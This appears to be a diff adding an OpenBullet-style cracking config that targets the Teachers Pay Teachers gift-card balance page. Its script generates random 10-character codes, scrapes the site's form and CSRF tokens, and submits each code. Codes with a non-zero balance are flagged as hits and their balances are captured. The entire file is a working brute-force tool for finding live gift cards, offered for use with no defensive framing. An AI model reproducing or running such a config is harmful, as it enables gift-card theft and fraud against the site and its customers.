@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "TPT",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-16T02:33:04.496975-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?d?l?d?l?d?u?d?u?d?l" -> CAP "CODE" 
+
+REQUEST GET "https://www.teacherspayteachers.com/Gift-Card/Check-Balance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"data[_Token][key]\" value=\"" "\"" -> VAR "T" 
+
+REQUEST POST "https://www.teacherspayteachers.com/Gift-Card/Check-Balance" 
+  CONTENT "_method=POST&data%5B_Token%5D%5Bkey%5D=<T>&data%5B_Csrf%5D%5BcsrfKey%5D=<COOKIES(csrfToken)>&data%5B_Csrf%5D%5BcsrfToken%5D=<COOKIES(csrfToken)>&data%5BGiftCertificate%5D%5Bcode%5D=<CODE>&data%5B_Token%5D%5Bfields%5D=84ec0959b113fd49c00d405bcd03fe39887cf039%253A&data%5B_Token%5D%5Bunlocked%5D=GiftCertificate.recipient_email" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.teacherspayteachers.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 398" 
+  HEADER "Accept: text/html, */*; q=0.01" 
+  HEADER "X-CSRF-Token: <COOKIES(csrfToken)>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://www.teacherspayteachers.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.teacherspayteachers.com/Gift-Card" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: ajs_anonymous_id=<COOKIES(ajs_anonymous_id)>; device=desktop; originalDevice=desktop; csrfToken=<COOKIES(csrfToken)>; classfundSummary={%22active%22:true%2C%22isDraft%22:false}; Ti=<COOKIES(Ti)>; TPT-AB-HASH=<COOKIES(TPT-AB-HASH)>; TPT=<COOKIES(TPT)>" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "Your current balance" 
+    KEY "<SOURCE>" DoesNotContain "class=\"balance_amount\">$0.00</" 
+  KEYCHAIN Failure OR 
+    KEY "Enter the 10-Digit Gift Card code" 
+    KEY "Invalid Redemption Code" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "class=\"balance_amount\">$0.00</" 
+
+PARSE "<SOURCE>" LR "class=\"balance_amount\">" "<" CreateEmpty=FALSE -> CAP "BALANCE" 
+
